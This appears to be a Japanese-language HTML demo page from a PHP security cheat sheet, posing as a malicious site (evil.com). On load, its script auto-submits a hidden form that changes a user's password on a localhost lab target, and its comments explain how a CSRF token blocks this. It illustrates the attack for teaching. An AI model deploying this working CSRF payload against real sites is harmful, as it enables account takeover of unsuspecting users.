<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>悪意のあるサイト（evil.com）</title>
</head>
<body>
    <h1>攻撃用</h1>
    <p>攻撃後、<a href="http://localhost/cheatsheet/php/csrf/target.com/change_password.php">http://localhost/csrf/target.com/change_password.php</a>にPOST送信で遷移するため、このページが表示されることはない</p>
    <script>
        'use strict';

        document.addEventListener('DOMContentLoaded', function() {
            // 隠しフォームを生成
            const form = document.createElement('form');
            form.setAttribute('action', 'http://localhost/cheatsheet/php/csrf/target.com/change_password.php');
            form.setAttribute('method', 'POST');
            form.setAttribute('style', 'display:none;'); // ユーザーからは見えないようにする

            // 新しいパスワードの入力フィールドを生成
            const input = document.createElement('input');
            input.setAttribute('type', 'hidden'); // 隠しフィールド
            input.setAttribute('name', 'new_password');
            input.setAttribute('value', 'hacked_by_csrf_post'); // 攻撃者が指定する新しいパスワード

            // フォームにフィールドを追加
            form.appendChild(input);

            // ~~~ CSRFトークンによる対策をしていた場合 ~~~
            // ここにCSRFトークンを含めることができないため、攻撃は失敗する
            // const csrfInput = document.createElement('input');
            // csrfInput.setAttribute('type', 'hidden');
            // csrfInput.setAttribute('name', 'csrf_token');
            // csrfInput.setAttribute('value', 'ここにtarget.comのトークンが必要'); // これが攻撃者には知りようがない！
            // form.appendChild(csrfInput);

            // フォームをbodyに追加（ページに表示はされない）
            document.body.appendChild(form);

            // フォームを自動送信
            form.submit();
        });
    </script>
</body>
</html>
